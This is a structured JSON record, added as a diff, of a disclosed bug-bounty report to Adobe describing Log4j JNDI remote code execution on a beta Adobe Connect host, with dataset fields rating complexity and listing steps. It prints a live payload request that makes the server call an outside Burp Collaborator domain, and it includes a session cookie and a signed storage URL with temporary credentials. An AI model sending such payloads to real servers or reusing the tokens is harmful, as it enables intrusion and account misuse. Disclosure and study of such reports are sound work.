@@ -1,0 +1,47 @@
+{
+  "reported_to": "Adobe",
+  "reported_by": "sheikhrishad0 ",
+  "title": "Log4j Java RCE in [beta.dev.adobeconnect.com]",
+  "content": "\nHello Security Team,\nSummary\nLog4j versions prior to 2.15.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.\nAs per Apache's Log4j security guide: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.\nPlatform Affected: [website]\nhttps://beta.dev.adobeconnect.com\nProof of concept:\nRequest:\nCode 618 Bytes\n1GET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1\n2Host: beta.dev.adobeconnect.com\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Connection: close\n8Cookie: BREEZESESSION=breezdiekv3smcc2xdw3u; BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S\n9Upgrade-Insecure-Requests: 1\n10Sec-Fetch-Dest: document\n11Sec-Fetch-Mode: navigate\n12Sec-Fetch-Site: none\n13Sec-Fetch-User: ?1\nResponse:\n<image_0>\nImpact\nLogging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.\nRegards,\nSheikh rishad\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4u3w7auvrorzb2jagxgjqazt836d?response-content-disposition=attachment%3B%20filename%3D%22PoC.jpeg%22%3B%20filename%2A%3DUTF-8%27%27PoC.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LRGQIWZ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T032625Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIA9TkMA2NFXpWyd2Vq1aG2VmSVlS56fcnVkjFbgBbPEwAiEAlu8Xk6HLjbGRnhU41VXsGpB9DFqinzuSYOzrRGVc%2BfwqugUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCSp%2FDi7N1qOtbEW6iqOBU4IERqRCsA8mcakjfkG9J84qaGgT1f539BlKeeDXi1uGAHKdR250pdsfvV%2Bl4jpFE7emTyYDmBTcB1GWhvmFob6sFNOnPMtjNBiR3uTpZisGYsrlWRtWuiCFYatPEer%2F4CsChNhsQAIT%2B6FoCWKlgHNB1SxQe%2F8nexU7yyjt%2B7%2FjmPShkQ4ZQcpzRTWhYWuI6Vpatz213f4fNnDDvqxxdUwTm6XgINBcriLuy76AoSgrNzeqMrxwzsvVFRQQMauiCaaEBxxIF1jc2lbHAmkoBgJ6Ld7o%2FTp1SbYkV4L4Y0baS%2Bh5egjRFN4l3Nh1hy2phGG2xPMZikkSBBTGuPvr3Xitc9o5zCi0qmo9xF%2Fz7jGB5TRfRy79MjRJERxqn8YxmGjn6DGVuE4astI82%2FD1EaZ7ubksF0ABB75uzmC%2BDEZvCTNCxzIi28HAJK%2FuyMJN37DbxHwMerXeRUEVGoC1lXhYv6s5uZLIxphgB%2FL%2By3QdkLU9vhHyptrD8kOMrppPrmHbvHMSAZrZXCNNQuBsLomR8PGi2qDKJbAQn2bWxmwHqCi%2BYgmJ6mcbL9xWE%2BovLp1UABRV70IsQlUelzp77LQTtlRvSQn7S6QclyNIdoNEUhQopAxoswRc%2BX%2FuyJwO8lCf1WTEmv1xY6V7Y%2B8p1vw2QxjFzBbnFOnou5mej6eS2WVMFtL312%2FHid%2BF1jyM3Cy3TWve2wnwvIvG98b3WMEUeUQW4q2MdRYV8GcH7w%2FRkJ3E7bK7slPgm3GDMS6eyWAr5hMiW6yq7aPyL%2F8n5tQK8WotkZ4NZ47YGNhCuA2LDRhZwcfYrvjJEjcrrCiMLUymZMlunPzsi4f9iRvxIR%2FRZG5%2FGYAUGRhv0kA%2FDDe%2BIe%2FBjqxAQ%2Bh%2B%2BWPjgJuoEHJpgmFIke0j9J7Gpq9gDz2ZeQzlnR%2BQ6668SbEm1plDQklF2l%2F8wZVwLEpWEoD2RrkHgO44wVPgyCt9l%2Fx%2FmeP28Xy4yxzoPmFsYt0soQOXjN1XpxKEs%2FpS9f6uRPVPU2CVa%2BGwGB775obEDBHvp2z%2BnHbczdUb0Sv4XG6PatnFm%2Fy6KG4drdFkbr4e41ANBfLv4rKjBsn8jefAtf0vnbq%2FnmSachLFQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4890fb707d93eddec70486340eb11df5c071d4caf2343bad15a41275e969ce22"
+  },
+  "disclosed_date": 1647894360,
+  "report_url": "https://hackerone.com/reports/1442644",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a crafted HTTP GET request to the target URL with a JNDI lookup string in the query parameter: GET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1"
+    ],
+    [
+      2,
+      "Observe the response or check the Burp Collaborator for any incoming LDAP requests, indicating the server is vulnerable to Log4j RCE"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Remote Code Execution (RCE) in Log4j versions prior to 2.15.0, where an attacker can exploit the JNDI lookup feature to execute arbitrary code via LDAP. The server logs the malicious input, triggering the vulnerability.",
+  "reason": "The attack is straightforward, involving a single HTTP request with a crafted JNDI lookup string. No complex interactions or state manipulations are required. The vulnerability is well-documented and widely known, making it easy to discover and exploit.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The Log4j vulnerability report involves a Remote Code Execution (RCE) issue due to a specific version of Log4j being vulnerable to LDAP JNDI attacks. This is not an authentication or authorization (AuthN/AuthZ) issue, but rather a software vulnerability in a specific component. The methodologies described focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are not applicable here.",
+    "is_detectable": false
+  }
+}
